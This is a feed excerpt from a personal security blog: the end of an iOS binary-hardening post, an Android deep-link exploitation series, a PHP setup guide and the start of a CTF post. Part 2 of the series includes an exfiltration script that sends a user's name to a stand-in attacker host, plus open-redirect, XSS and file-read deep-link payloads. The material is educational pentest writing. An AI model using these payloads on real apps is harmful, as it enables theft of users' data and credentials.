src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="990" height="382" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.27.32.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.27.32.png 990w"></figure><p>In order to compile the libraries without <code>rpath</code> you need to use some hidden build flags. On your local command line run:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="943" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-19-at-19.33.44.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-19-at-19.33.44.png 943w"></figure><p>Note the swift compiler option <code>no-stdlib-rpath</code> which disables <code>rpath</code> entries during compilation.</p><p>Configure your build settings so that the application is built with this configuration flag, e.g.: <code>swift build -c release -Xswiftc -no-toolchain-stdlib-rpath</code>.</p><h2 id="symbols-stripped">Symbols Stripped</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>From Apple&apos;s <a href="https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information">Building Your App to Include Debugging Information</a>:</p><blockquote>When Xcode compiles your source code into machine code, it generates a list of symbols in your app&#x2014;class names, global variables, and method and function names. <br>These symbols correspond to the file and line numbers where they&#x2019;re defined; this association creates a <em><em>debug symbol</em></em>, so you can use the debugger in Xcode, or refer to line numbers reported by a crash report. <br>Debug builds of an app place the debug symbols inside the compiled binary file by default, while <strong>release builds of an app place the debug symbols in a companion <em><em>Debug Symbol file</em></em> </strong>(<code>dSYM</code>) to reduce the size of the distributed app.</blockquote><p>So, the good thing about these <code>dSYM</code> files is that you can store them separately and then use them to <a href="https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report">symbolicate</a> your logs without actually letting the end user have access to them via App Store:</p><pre><code>~ symbolicatecrash &quot;&lt;path-to-crash-file&gt;&quot; &quot;&lt;path-to-dSYM file&gt;&quot; &gt; symbolicated.crash</code></pre><p>By default, <code>dSYM</code> files are generate for &quot;Release&quot; builds, which you can check by reviewing your <code>&quot;Build Settings&quot;</code>:</p><ul><li><code>Generate Debug Symbols</code> = <code>YES</code></li><li><code>Debug Information Format</code> = <code>DWARF with dSYM File</code></li></ul><p>A simple way to check whether or not your application was compiled with debug symbols is to again run <code>otool</code> with the <code>-Iv</code> flags:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.32.20.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Alternatively, you can use <code>nm</code>, which &quot;displays the name list (symbol table) of each &#xA0;object file in the argument list&quot;.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1101" height="474" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.43.08.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.43.08.png 1101w"></figure><p>If MobSF flags you project as containing debug symbols, please ensure that your project&apos;s <code>&quot;Build Settings&quot;</code> contain the following <code>&quot;Release&quot;</code> configurations:</p><ul><li><code>Deployment Postprocessing</code> = <code>YES</code>;</li><li><code>Strip Debug Symbols During Copy</code> = <code>YES</code>;</li><li><code>Strip Linked Product</code> = <code>YES</code>;</li><li><code>Strip Installed Product</code> &#xA0;= <code>YES</code> (works for non-App Store distributed builds if you&apos;ve set <code>Deployment Postprocessing</code> to <code>YES</code>)</li></ul><p>Finally, note that you can actually manually strip your binary, but as shown below, this invalidates the code signature:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1410" height="49" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-22-at-11.46.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.46.45.png 1410w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="useful-links">Useful Links</h2><ul><li><a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/">http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis/</a></li><li><a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf</a></li><li><a href="https://iphonedev.wiki/index.php/Crack_prevention">https://iphonedev.wiki/index.php/Crack_prevention</a></li><li><a href="https://blog.krzyzanowskim.com/2018/12/05/rpath-what/">https://blog.krzyzanowskim.com/2018/12/05/rpath-what/</a></li><li><a href="https://objective-see.com/blog/blog_0x46.html">https://objective-see.com/blog/blog_0x46.html</a></li><li><a href="https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk">https://stackoverflow.com/questions/3656391/whats-the-dsym-and-how-to-use-it-ios-sdk</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 2]]></title><description><![CDATA[<p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-2/</link><guid isPermaLink="false">611910dbfd1c6c08ebabad54</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[text injection]]></category><category><![CDATA[open redirect]]></category><category><![CDATA[xss]]></category><category><![CDATA[LFI]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 15 Aug 2021 15:17:07 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 2"><p>In this part, we&apos;re going to start to answer the question: &quot;What can you do if you can trick a user into clicking a malicious deep link?&quot;</p><hr><p>Let&apos;s go back to the <code>ABC Bank</code> example. <code>ABC Bank</code> has both a web and an Android application, and they use deep links to improve the user experience of transitioning between the two.</p><h2 id="text-injection">Text Injection</h2><p>So, the first thing they want to do is allow the user to view messages in their application. In order to do that, they use the following deep link:</p><pre><code>abcbank://view-message?message=&lt;message&gt;</code></pre><p>The Android application takes the <code>message</code> parameter and injects it into a <a href="https://developer.android.com/reference/android/widget/TextView">TextView</a> element:</p><pre><code class="language-Java">String message = getIntent().getData().getQueryParameter(&apos;message&apos;)
TextView messageTextView = (TextView)findViewById(R.id.msgTextView);
messageTextView.setText(message);</code></pre><p>In this scenario, it&apos;s possible that a malicious user creates a deep link that tricks a victim into completing some sort of action, e.g.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1437" height="803" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.36.31.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.36.31.png 1437w" sizes="(min-width: 720px) 720px"></figure><h2 id="open-redirect">Open Redirect</h2><p>Let&apos;s say a customer is not sure about how to complete a specific operation, so they call the bank&apos;s customer support line and the ABC Bank&apos;s employee decides to send a deep link to the customer, so they can open a specific website page inside their Android application:</p><pre><code>abcbank://help?page=https://abcbank.com/how-to-setup-mfa</code></pre><p>Inside the application there&apos;s a <a href="https://developer.android.com/guide/webapps/webview">WebView</a> and whatever URL is received via this <code>page</code> parameter is loaded without any additional validation, as so:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;page&apos;);</code></pre><p>In this scenario, a malicious attacker can craft a malicious deep link that replaces this <code>page</code> parameter with any other URL, e.g.:</p><pre><code>abcbank://help?page=https://malicious.com</code></pre><p>The result:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 2" loading="lazy" width="1438" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-15-at-15.46.07.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-15-at-15.46.07.png 1438w" sizes="(min-width: 720px) 720px"></figure><p>Now, this is bad by itself, but there&apos;s yet another danger.</p><h3 id="open-redirect-access-to-web-bindings">Open Redirect + Access to Web Bindings</h3><p>Let&apos;s say that the vulnerable WebView is used for multiple things inside the application, and one of those operations requires that the WebView has access to the username, that&apos;s stored inside the Android application.</p><p>In that case, the application can register a JS interface, e.g.:</p><pre><code class="language-Java">webview.addJavascriptInterface(WebAppInterface(this), &quot;Android&quot;)</code></pre><p>Then, inside the <code>WebAppInterface</code>, we can create a method such as:</p><pre><code class="language-Java">public final String getUserName() {
	return this.store.getUserName();
}</code></pre><p>Finally, the malicious attacker can create a malicious page that exfiltrates the user name of its visitors, as shown below:</p><pre><code>// https://malicious.com/index.html

&lt;DOCTYPE html&gt;
&lt;head&gt;
&lt;script&gt;
    var req = new XMLHttpRequest();
    xmlhttp.open(&quot;POST&quot;, https://malicious.com/user-data);
    xmlhttp.send(JSON.stringify(window.Android.getUserName()));
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
...</code></pre><p>The only thing left to do is to convince the victim to click the malicious deep link where this code is hosted:</p><pre><code>abcbank://help?page=https://malicious.com/index.html</code></pre><p>Note that in order for this to work there&apos;s an additional requirement, the WebView needs to have <a href="https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled(boolean)">JavaScript enabled</a>:</p><pre><code>webview.getSettings()setJavaScriptEnabled(true);</code></pre><h2 id="the-dangers-of-webviewloadurl">The dangers of WebView.loadUrl</h2><p>As we saw on the Open Redirect example shown above, we can use the <a href="https://developer.android.com/reference/android/webkit/WebView#loadUrl(java.lang.String)">loadUrl</a> method to load the given URL into a WebView:</p><pre><code class="language-Java">webview.loadUrl(getIntent().getData().getQueryParameter(&apos;url&apos;);</code></pre><p>However, this method doesn&apos;t only support <code>http(s)</code> schema but also <code>javascript:</code>, <code>file://</code>, etc.</p><p>This means that whenever we find an Open Redirect via this method, we should always test for <code>XSS</code> and <code>LFI</code>, e.g.:</p><pre><code>abcbank://help?page=javascript:alert(document.cookie)
abcbank://help?page=file:///sdcard/CDAInfo.txt</code></pre><p>Note that the first will only be possible if JavaScript is enabled, and the latter requires that local file access is possible!</p><h2 id="the-dangers-of-webviewloaddata">The dangers of WebView.loadData</h2><p>As the name suggests we can use <code>loadData</code> method to load data into a WebView using a <code>&apos;data&apos;</code> scheme URL. </p><p>This allows us to do some fun stuff like taking some <code>HTML</code> from a deep link parameter and injecting it directly into a WebView with JavaScript enabled, as shown in the example below:</p><pre><code>String html = getIntent().getData().getQueryParameter(&apos;html&apos;)

WebView wv = new WebView(this);
wb.getSettings().setJavaScriptEnabled(true);
wv.loadData(html, &quot;text/html&quot;, &quot;UTF-8&quot;)</code></pre><p>Now, we can go wherever imagination takes us, we&apos;re only restricted by the application&apos;s features and security restrictions: </p><ul><li>we can test to see if the user&apos;s <code>Cookie</code> or other authentication token is accessible via JavaScript, and exfiltrate by triggering JS using a <code>&lt;script&gt;</code> element;</li><li>we can try to exfiltrate any other private user information again using a <code>&lt;script&gt;</code> element</li><li>we can inject some <code>CSS</code> and <code>HTML</code> that hides the actual content and displays a fake login screen to trick the user into entering their credentials</li><li>an many more ...</li></ul><hr><p><a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-3/index.html">Next</a>, we&apos;ll look into other fun vulnerabilities such as LFI and even RCE using deep links.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 1]]></title><description><![CDATA[<p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part1/</link><guid isPermaLink="false">610e4a2dfd1c6c08ebaba859</guid><category><![CDATA[android]]></category><category><![CDATA[mobile]]></category><category><![CDATA[deep links]]></category><category><![CDATA[link hijacking]]></category><category><![CDATA[phishing]]></category><category><![CDATA[scheme urls]]></category><category><![CDATA[app links]]></category><category><![CDATA[intent urls]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 13 Aug 2021 18:22:56 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/maxresdefault.jpeg" alt="Exploiting Deep Links in Android - Part 1"><p>Deep links are an often overlooked way to exploit Android applications.</p><p>In this series I hope to do a deep dive into their history, common vulnerabilities with real-life examples, possible mitigations, and testing techniques for pentesters and researchers.</p><p>In this first part, we do a quick overview of the supported deep link formats in Android, and then quickly jump into the first vulnerability: <strong>Link Hijacking</strong>.</p><hr><h2 id="an-intro-to-deep-links-in-android">An Intro to Deep Links in Android</h2><p>In short, deep links allow users to open specific content inside a mobile application.</p><p>In Android, there are 3 valid deep link formats:</p><ol><li><code>Scheme URLs</code> (aka <code>Custom Scheme URLs</code> or <code>URL Schemes</code>)</li><li><code>App Links</code> (aka <code>Android App Links</code>)</li><li><code>Intent URLs</code> (aka <code>Intent Scheme URLs</code>)</li></ol><p>Note that the first 2 have an iOS equivalent, while the 3rd only exists in Android.</p><h3 id="scheme-urls">Scheme URLs</h3><p>Scheme URLs were introduced with <code>Android 1.0</code> and <code>iOS 2.0</code> and clearly prioritised flexibility rather than security.</p><p>In this first iteration of deep links, <strong>any application can register any scheme, host and path</strong>, e.g.:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/GD5GzXCpD1TKrM1hnu1qcvNhs2_yIQn-2nrKrDrH4YRCIas12eCYr3N74GHPHNqtzJAmLOZnwCtB4kfcEEtmCfB9DHq_uNSd35zLO4wXkr6SG-_I_SYC7Ylczusju4M4MXfEbyUJruk" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>This means that there&apos;s no mechanism to ensure, for example, that all deep links with the <code>fb://</code> scheme are handled by the Facebook app.</p><p>If a user clicks on a deep link, the OS starts by checking which of the applications installed on the device have registered it:</p><ul><li>if there is <strong>only 1 application</strong>, the OS will automatically open the deep link with that application;</li><li>if there is more than 1 application, the OS will check if any of them <strong>have previously been set as the &quot;preference&quot;</strong> - if so, the OS will open the link with that application;</li><li>if there is more than 1 application and none of them have ever been set as the preference, the OS will prompt the user to choose between the apps.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.33.50.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="165"></figure><p>Note that if the user clicks &quot;Always&quot; on this prompt, the chosen application becomes the preference, and the prompt will not be shown again.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/image-2.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="508" height="444"></figure><p>Since any app can register any scheme, a victim application can become vulnerable to Link Hijacking, which we&apos;ll discussed in more detail at the end of this part.</p><h3 id="app-links">App Links</h3><p>App Links were introduced in 2015 with <code>Android 6</code> and <code>iOS 9</code> - note that in iOS they&apos;re called <a href="https://developer.apple.com/ios/universal-links/">Universal Links</a>.</p><p>App Links no longer support custom schemes, only <code>HTTP</code> or <code>HTTPS</code>. This makes the links &quot;natively&quot; compatible with any browser:</p><figure class="kg-card kg-image-card"><img src="https://lh6.googleusercontent.com/R3QhI5qKJ94cfy_uvz28KSeLJkzk5jFpQzbDCdkCcgFCVajTgpl8i1RNepFyctgXH9HZlcKM8xkztDYrcS8Q5U_yNWdHgvRGSd9LiVrsFBphl9a0ilWTpqZhcbUDIAXHlZOhYMQPrYQ" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>More important, when it comes to security, App Links introduced a mechanism that (at least in theory) prevents other apps from claiming a link: <a href="https://developer.android.com/training/app-links/verify-site-associations">App Link Association</a>.</p><p><strong>App Link Association</strong></p><p>The idea is pretty simple: to make sure that all <code>https://foo.com</code> deep links are always handled by the <code>foo</code> application, the team at Foo simply needs to add a specific file on the <code>foo.com</code> server that contains the <code>SHA256</code> fingerprint of the <code>foo</code> app&apos;s signing certificate - see more details <a href="https://developer.android.com/training/app-links/verify-site-associations">here</a>.</p><p>When the <code>foo</code> application is being installed on the device, its <code>AndroidManifest.xml</code> file should indicate that it wants to register and verify the <code>https://foo.com</code> App Link, and as a result the OS will check the aforementioned file - if everything&apos;s OK, no other app will be able to claim this link.</p><figure class="kg-card kg-image-card"><img src="https://lh5.googleusercontent.com/7Pnd9LH0pel0rbFOvQqcQBuekklcA-YYIWEPOEpN_yZVDHB3sPgZVkgTV-rlIk2jHtS0jAz619EPBarBHsEh3LW83kBJ6zuOH9KPqbCbfCZOJ_e3JrngRznwwG_2WU9EzLi3IOUSwCw" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>So, the good people at Foo no longer need to worry about Link Hijacking right? ... Nope.</p><p>First, we should note that iOS and Android have different policies when it comes to handling failed verifications:</p><ul><li>iOS prohibits opening unverified Universal Links;</li><li>Android, however, leaves the decision up to users: if an unverified App Link is clicked, Android prompts users to choose if they want to open the link in the app or the browser.</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.34.43.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy"></figure><p>Worse even, according to <a href="https://people.cs.vt.edu/gangwang/deep17.pdf">a 2017 study</a>, most apps that use App Links are not correctly completing the verification process! <br>Some common errors included:</p><ul><li>Not creating the associate file</li><li>Registering the App Link with a protocol that doesn&apos;t match the file (<code>HTTP</code> vs <code>HTTPS</code>)</li><li>Having an invalid associate file</li><li>Having an invalid manifest file</li></ul><p>Finally, there is one type of Android app that is particularly vulnerable to link hijacking even when using App Links: <a href="https://developer.android.com/topic/google-play-instant">Instant Apps</a>.</p><p>This article won&apos;t go into detail regarding these vulnerabilities, but if you&apos;re interested I highly recommend <a href="http://www4.comp.polyu.edu.hk/~csxluo/AppLink.pdf">this paper</a>.</p><h3 id="intent-urls">Intent URLs</h3><p>Finally, let&apos;s look at the least used deep link type: Intent URLs. They were introduced in 2013 and have a completely different syntax:</p><p><code>intent://p/#Intent;scheme=foo;package=com.foo;end</code>. </p><p>As you can see, the package name of the target app is explicitly specified, which means the OS doesn&apos;t prompt the user for their decision, making them <strong>resistant to the types of link hijacking detailed below</strong>.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.35.13.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="110"></figure><hr><h2 id="link-hijacking">Link Hijacking</h2><p>As mentioned before, the fact that any application can register any Scheme URL, along with the improper implementation of App Links can make applications vulnerable to Link Hijacking, also known as &quot;Deep Link Collision&quot;.</p><p>But, why is this an issue?</p><h3 id="phishing">Phishing</h3><p>Imagine that a user installs a game application on their Android phone. Whenever the user opens the app they just see the game but, in fact, during installation this application registered a deep link that &quot;belongs&quot; to a banking app - <code>abcbank://</code> - which just so happens to be the user&apos;s bank.</p><p>One day this user happens to click on the same deep link registered by the &quot;malicious&quot; game app - this isn&apos;t strange since it&apos;s a valid deep link used by the actual ABC Bank.</p><p>Since the user doesn&apos;t yet have the <code>abcbank</code> application installed on their phone, the OS will automatically open the link with the game app. However, now instead of showing the regular game UI, this malicious app displays a login screen that looks exactly like the login screen for <code>abcbank</code>.</p><p>If the malicious application is able to trick the user into entering their <code>ABC Bank</code> credentials on this login screen, it&apos;s game over.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1436" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-21.27.40.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1436w" sizes="(min-width: 720px) 720px"></figure><h3 id="capturing-sensitive-data">Capturing Sensitive Data</h3><p>In 2019, it was <a href="https://hackerone.com/reports/855618">reported</a> that the Arrive app (now called <a href="https://play.google.com/store/apps/details?id=com.shopify.arrive&amp;hl=en_US&amp;gl=US">Shop</a>) was vulnerable to Account Takeover due to an unverified App Link:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="987" height="463" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-18.23.49.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png 987w"></figure><p>As shown in this example, whenever deep links are used to communicate sensitive data such as authentication tokens, an attacker can use link hijacking to intercept this data.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1437" height="806" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-22.35.39.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1437w" sizes="(min-width: 720px) 720px"></figure><h3 id="traffic-hijacking">Traffic Hijacking</h3><p>In their 2017 study, &quot;<a href="https://people.cs.vt.edu/gangwang/deep17.pdf">Measuring the Insecurity of Mobile Deep Links of Android</a>&quot;, Liu et al. reviewed 160,000+ applications (retrieved from the Play Store) and found many instances of applications that seemed to be registering custom schemes for popular applications in order to boost traffic to their own app. </p><p>They found, for example, that <code>google.com</code> is registered by 480 apps from 305 non-Google developers and that <code>google.navigation</code> from Google Maps was hijacked by 79 apps from 32 developers.</p><h3 id="competing-apps">Competing Apps</h3><p>In the same study mentioned above, it was found that a lot of applications register their competitors&apos; schemes in order to trick users into using their apps:</p><blockquote>For example, Careem (<code>com.careem.acma</code>) and QatarTaxi (<code>com.qatar.qatartaxi</code>) are two competing taxi booking apps in Dubai. Careem is more popular (5M+ downloads), which uses scheme <code>careem</code> for many functionalities such as booking a ride (from hotel websites) and adding credit card information. <br>QatarTaxi (10K downloads) registers to receive all <code>careem://*</code> deep links.<br>After code analysis, we find all these links redirect users to the QatarTaxi app&#x2019;s home screen, as an attempt to draw customers.</blockquote><hr><p>Hope you found this useful, on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">the next part</a> we&apos;ll try to see what happens when a user clicks on a malicious deep link.</p>]]></content:encoded></item><item><title><![CDATA[Running a PHP application on Big Sur using Apache]]></title><description><![CDATA[<p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd</code></pre>]]></description><link>inesmartins.github.io/running-php-app-on-big-sur-using-apache/</link><guid isPermaLink="false">60f93a52fd1c6c08ebab9dd6</guid><category><![CDATA[php]]></category><category><![CDATA[apache]]></category><category><![CDATA[big sur]]></category><category><![CDATA[macOS]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 23 Jul 2021 10:18:15 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" alt="Running a PHP application on Big Sur using Apache"><p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd -v 
Server version: Apache/2.4.46 (Unix)
Server built:   May  8 2021 03:38:34</code></pre><p>In order to start the server you can run:</p><pre><code>~ sudo apachectl start</code></pre><p>Open &#xA0;<code>localhost</code> in any browser and you should see:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-10.38.05.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="413" height="105"></figure><h3 id="configuring-apache-to-run-php-7">Configuring Apache to run PHP 7</h3><p>Big Sur also comes with PHP installed, but the local Apache configs may not support running PHP by default. </p><p>In order to activate this setting, open <code>/etc/apache2/httpd.conf</code> with <code>nano</code> or any other text editor and uncomment the following line:</p><pre><code>LoadModule php7_module libexec/apache2/libphp7.so</code></pre><p>PHP is now enabled, all you need to do is restart the Apache web server for the changes to take effect:</p><pre><code>~ sudo apachectl restart</code></pre><h3 id="setting-up-mysql">Setting up mySQL</h3><p>Ensure that you have mySQL correctly installed and running on your machine.</p><ul><li>you can download the <code>.dmg</code> from <a href="https://dev.mysql.com/downloads/mysql/">here</a>, then follow the instructions on the wizard. </li><li>once the wizard is done go to <code>System Preferences</code> &gt; <code>MySQL</code> and ensure that the server is running as shown below:</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="671" height="564" srcset="inesmartins.github.io/content/images/size/w600/2021/07/Screenshot-2021-07-22-at-11.43.55.png 600w, inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png 671w"></figure><p>In order to have mySQL binaries available via command line, you can also add <code>/usr/local/mysql/bin/</code> to the <code>PATH</code>. In my case I did:</p><pre><code>~ nano ~/.zshrc
...
export PATH=/usr/local/mysql/bin:$PATH</code></pre><p>Finally, you need to ensure PHP and MySQL can communicate with one another, which you can achieve by running:</p><pre><code>~ cd /var
~ sudo mkdir mysql
~ cd mysql
~ sudo ln -s /tmp/mysql.sock mysql.sock</code></pre><h3 id="serving-the-application">Serving the application</h3><p>Check Apache&apos;s default <code>DocumentRoot</code> on <code>/etc/apache2/httpd.conf</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/image-1.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="592" height="135"></figure><p>As you can see, in my case it&apos;s <code>/Library/WebServer/Documents</code>.</p><p>This means that this is the <strong>directory where you should put your PHP application</strong>.</p><p>Once the app is inside this directory you&apos;ll be able to see it running by going to &#xA0;<a href="http://localhost/app/web/">http://localhost/&lt;</a>path-to-your-initial-file&gt;.</p>]]></content:encoded></item><item><title><![CDATA[USB Keyboard capture parser]]></title><description><![CDATA[<p>During a recent CTF I had to extract keys from a USB Keyboard capture, and (as usual) decided to create a simple Python 3 script to parse the original keys.</p><p>As shown on the <a href="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js">Gist below</a>, this script takes any <code>.pcap</code> file and optionally the path to the <code>tshark</code> executable,</p>]]></description><link>inesmartins.github.io/usb-keyboard-capture-parser/</link><guid isPermaLink="false">60d63298eb71c50b03cad85d</guid><category><![CDATA[tshark]]></category><category><![CDATA[pcap]]></category><category><![CDATA[usb keyboard]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 18 Jul 2021 11:20:39 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-18-at-12.24.09.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-18-at-12.24.09.png" alt="USB Keyboard capture parser"><p>During a recent CTF I had to extract keys from a USB Keyboard capture, and (as usual) decided to create a simple Python 3 script to parse the original keys.</p><p>As shown on the <a href="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js">Gist below</a>, this script takes any <code>.pcap</code> file and optionally the path to the <code>tshark</code> executable, and:</p><ol><li>extracts the relevant data from the capture file to a temporary <code>.txt</code> file, using <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark</a></li><li>parses each line from this file and extracts the relevant data, namely the key 